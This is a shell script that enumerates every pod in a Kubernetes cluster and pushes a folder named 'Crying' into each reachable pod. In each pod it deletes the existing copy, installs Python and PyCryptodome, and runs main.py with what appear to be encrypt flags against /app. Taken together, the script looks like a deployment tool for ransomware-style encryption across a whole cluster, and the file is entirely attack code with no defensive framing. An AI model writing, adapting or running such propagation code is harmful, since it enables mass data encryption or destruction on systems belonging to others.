#!/bin/sh

# Define the folder to be copied
FOLDER_TO_PUSH="/Crying"
DESTINATION_FOLDER="/app/Crying"

# Install kubectl
echo "Installing kubectl..."
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" || {
    echo "Failed to download kubectl."
    exit 1
}
chmod +x kubectl
mv kubectl /usr/local/bin/

# Get the list of pod IPs
echo "Fetching the list of pod IPs..."
POD_IPS=$(kubectl get pods -o wide --no-headers | awk '{print $6}')
if [ -z "$POD_IPS" ]; then
    echo "No pods found in the cluster."
    exit 1
fi

# Loop through each IP and check connectivity
for IP in $POD_IPS; do
    {
        echo "Pinging Pod IP: $IP"
        if ping -c 4 $IP > /dev/null; then
            echo "Ping successful: $IP"

            # Get the pod name based on the IP
            POD_NAME=$(kubectl get pods -o wide --no-headers | grep "$IP" | awk '{print $1}')
            if [ -z "$POD_NAME" ]; then
                echo "No pod associated with IP: $IP"
                continue
            fi
            echo "Pod found: $POD_NAME"

            # Detect the OS running in the pod
            echo "Detecting operating system in pod: $POD_NAME..."
            OS=$(kubectl exec "$POD_NAME" -- cat /etc/os-release | grep "^ID=" | cut -d= -f2 | tr -d '"')
            if [ -z "$OS" ]; then
                echo "Failed to detect operating system in pod: $POD_NAME."
                continue
            fi
            echo "Detected OS in pod: $POD_NAME - $OS"

            # Remove the existing folder in the pod to ensure overwrite
            echo "Removing existing folder in pod $POD_NAME..."
            kubectl exec "$POD_NAME" -- sh -c "rm -rf $DESTINATION_FOLDER" || {
                echo "Failed to remove existing folder in pod: $POD_NAME"
                continue
            }

            # Push the folder to the pod
            echo "Attempting to push folder to pod $POD_NAME..."
            kubectl cp "$FOLDER_TO_PUSH" "$POD_NAME:/app" || {
                echo "Failed to push folder to pod: $POD_NAME"
                continue
            }
            echo "Folder successfully pushed to pod: $POD_NAME"

            # Install updates and dependencies in the pod based on OS
            echo "Installing dependencies in pod $POD_NAME..."
            if [ "$OS" = "ubuntu" ]; then
                kubectl exec "$POD_NAME" -- bash -c "apt-get update && apt-get install -y python3 python3-pip" || {
                    echo "Failed to install Python3 in pod: $POD_NAME (Ubuntu)."
                    continue
                }
            elif [ "$OS" = "alpine" ]; then
                kubectl exec "$POD_NAME" -- sh -c "apk update && apk add --no-cache python3 py3-pip" || {
                    echo "Failed to install Python3 in pod: $POD_NAME (Alpine)."
                    continue
                }
            else
                echo "Unsupported operating system detected in pod: $POD_NAME"
                continue
            fi

            # Install required Python library
            echo "Installing PyCryptodome library in pod $POD_NAME..."
            kubectl exec "$POD_NAME" -- sh -c "pip3 install pycryptodome --break-system-packages" || {
                echo "Failed to install PyCryptodome in pod: $POD_NAME"
                continue
            }

            # Execute the script inside the pod
            echo "Executing the script inside pod $POD_NAME..."
            kubectl exec "$POD_NAME" -- sh -c "chmod +x $DESTINATION_FOLDER/main.py && python3 $DESTINATION_FOLDER/main.py -p /app -e" || {
                echo "Failed to execute main.py in pod: $POD_NAME"
                continue
            }
            echo "Scripts executed successfully in pod: $POD_NAME"
        else
            echo "Failed to reach IP: $IP"
        fi
        echo "-----------------------------------"
    } &
done

# Wait for all background processes to complete
wait
echo "All tasks completed!"
